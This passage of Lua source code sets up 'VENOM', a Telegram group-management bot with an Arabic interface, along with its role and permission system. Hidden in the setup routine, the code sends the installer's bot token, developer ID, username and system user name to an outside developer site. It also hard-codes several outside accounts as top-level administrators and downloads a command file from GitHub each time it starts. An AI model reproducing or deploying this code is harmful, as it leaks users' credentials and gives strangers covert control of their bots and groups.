redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
end 
else
print('\27[0;35m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua VENOM.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;31m⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 

io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua VENOM.lua')
end
local create_config_auto = function()
config = {
botUserName = database:get(id_server..":token_username"),
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./Info.lua")   
end 
create_config_auto()
botUserName = database:get(id_server..":token_username")
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
UserName = database:get(id_server..":SUDO:USERNAME")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request('https://devloprahmedVNO.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("VENOM", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/VENOM
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
echo "TG IS NOT FIND IN FILES BOT"
echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
exit 1
fi
if [ ! $token ]; then
echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Info.lua \e[0m"
echo "⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺ ⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./VENOM.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("VNO", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/VENOM
while(true) do
rm -fr ../.telegram-cli
screen -S VENOM -X kill
screen -S VENOM ./VENOM
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./Info.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[


 ▄               ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄ 
▐░▌             ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌
 ▐░▌           ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌
  ▐░▌         ▐░▌  ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌
   ▐░▌       ▐░▌   ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌▐░▌ ▐░▐░▌ ▐░▌
    ▐░▌     ▐░▌    ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌
     ▐░▌   ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌▐░▌   ▀   ▐░▌
      ▐░▌ ▐░▌      ▐░▌          ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
       ▐░▐░▌       ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌
        ▐░▌        ▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
         ▀          ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀ 
                                                                       

                                                  

> CH › 「@SOURCEVENOM」
~> DEVELOPER › @Q_0_ll 
]])
sudos = dofile("./Info.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/VENOM197/Venom/main/File_Bot/commands.lua") 
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,1804133252,1360140225,944353237,1896382059}   
function SudoBot(msg)  
local VENOM = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
VENOM = true  
end  
end  
return VENOM  
end 
function Devban(msg) 
local hash = database:sismember(bot_id.."Dev:ban:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Dev(msg) 
local hash = database:sismember(bot_id.."Dev:ban:2", msg.sender_user_id_) 
if hash  then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function moall(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function onall(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function onall(msg)
local hash = database:sismember(bot_id..'onall'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."banda:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or Devban(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(1804133252) then  
var = true 
elseif tonumber(user_id) == tonumber(944353237) then
var = true  
elseif tonumber(user_id) == tonumber(1896382059) then
var = true  
elseif tonumber(user_id) == tonumber(1360140225) then
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:ban:2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'moall'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'onall'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'banda:MN:TF'..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(1804133252) then  
var = 'المبرمج باندا'
elseif tonumber(user_id) == tonumber(944353237) then
var = 'المبرمج'
elseif tonumber(user_id) == tonumber(1896382059) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1360140225) then
var = 'مبرمج افايره'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:ban:2", user_id) then
var = "المطور الثانوي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'مالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'onall'..chat_id, user_id) then
var = database:get(bot_id.."onall:Rd"..msg.chat_id_) or 'المدير العام '  
elseif database:sismember(bot_id..'moall'..chat_id, user_id) then
var = database:get(bot_id.."moall:Rd"..msg.chat_id_) or 'الادمن العام'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير '  
elseif database:sismember(bot_id..'banda:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'الـعـضـو'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function VNO_User(Chat_id,User_id) 
if database:sismember(bot_id..'VNO:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GVNO_User(User_id) 
if database:sismember(bot_id..'GVNO:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function getcustom(msg,scc)
local var = "لايوجد"
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..scc.sender_user_id_)
GeId = JSON.decode(Ge)
if GeId.result.custom_title then
var = GeId.result.custom_title
end
return var
end
function getbio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User)
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
local function Send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "SOURCEVENOM")
local NameUser = " 𖥔  مـن قبـل  ↚ ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = " 𖥔 اسم المستخدم  ↚ ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_," 𖥔 الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local VENOM_Msg = ''  
if msgs < 100 then 
VENOM_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
VENOM_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
VENOM_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
VENOM_Msg = 'متفاعل' 
elseif msgs < 1200 then 
VENOM_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
VENOM_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
VENOM_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
VENOM_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
VENOM_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
VENOM_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
VENOM_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
VENOM_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
VENOM_Msg = 'رب التفاعل'  
end 
return VENOM_Msg 
end
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n 𖥔 مالك الجروب')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n 𖥔 مجرد عضو هنا ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n 𖥔 الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️'
else
info = '✖'
end
if Json_Info.result.can_delete_messages == true then
delete = '✔️'
else
delete = '✖'
end
if Json_Info.result.can_invite_users == true then
invite = '✔️'
else
invite = '✖'
end
if Json_Info.result.can_pin_messages == true then
pin = '✔️'
else
pin = '✖'
end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️'
else
restrict = '✖'
end
if Json_Info.result.can_promote_members == true then
promote = '✔️'
else
promote = '✖'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ↓ \n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
function sendin(chat,msgid,user,user_id)
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user_id)
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
info = 'ꪜ' 
infoo = 'false' 
else 
info = '✘' 
infoo = 'true' 
end
if Json_Info.result.can_delete_messages == true then
delete = 'ꪜ' 
deletee = 'false' 
else 
delete = '✘' 
deletee = 'true' 
end
if Json_Info.result.can_invite_users == true then
invite = 'ꪜ' 
invitee = 'false' 
else 
invite = '✘' 
invitee = 'true' 
end
if Json_Info.result.can_pin_messages == true then
pin = 'ꪜ' 
pinn = 'false' 
else 
pin = '✘' 
pinn = 'true' 
end
if Json_Info.result.can_restrict_members == true then
restrict = 'ꪜ' 
restrictt = 'false' 
else 
restrict = '✘' 
restrictt = 'true' 
end
if Json_Info.result.can_promote_members == true then
promote = 'ꪜ' 
promotee = 'false' 
else 
promote = '✘' 
promotee = 'true' 
end 
if Json_Info.result.can_manage_voice_chats == true then
voice = 'ꪜ' 
voicee = 'false' 
else 
voice = '✘' 
voicee = 'true' 
end
if Json_Info.result.can_manage_chat == true then
manage = 'ꪜ' 
managee = 'false' 
else 
manage = '✘' 
managee = 'true' 
end

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تغيير المعلومات '..info, callback_data='amr@'..user..'/user@'..user_id.."/chenginfo"..infoo},
},
{
{text = 'حذف الرسائل '..delete, callback_data='amr@'..user..'/user@'..user_id.."/delmsgg"..deletee},
},
{
{text = 'حظر المستخدمين '..restrict, callback_data='amr@'..user..'/user@'..user_id.."/VNOuser"..restrictt},
},
{
{text = 'اضافه مستخدمين '..invite, callback_data='amr@'..user..'/user@'..user_id.."/addlink"..invitee},
},
{
{text = 'تثبيت الرسائل '..pin, callback_data='amr@'..user..'/user@'..user_id.."/pinmsg"..pinn},
},
{
{text = 'اداره المكالمات '..voice, callback_data='amr@'..user..'/user@'..user_id.."/voice"..voicee},
},
{
{text = 'البقاء متخفي '..manage, callback_data='amr@'..user..'/user@'..user_id.."/manage"..managee},
},
{
{text = 'اضافه مشرفين '..promote, callback_data='amr@'..user..'/user@'..user_id.."/addadmin"..promotee},
},
}
local Texti = 'تم تعديل صلاحياته'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'VENOM Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"VENOM":"'..NAME..'",'
else
t = t..',"'..v..'":{"VENOM":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
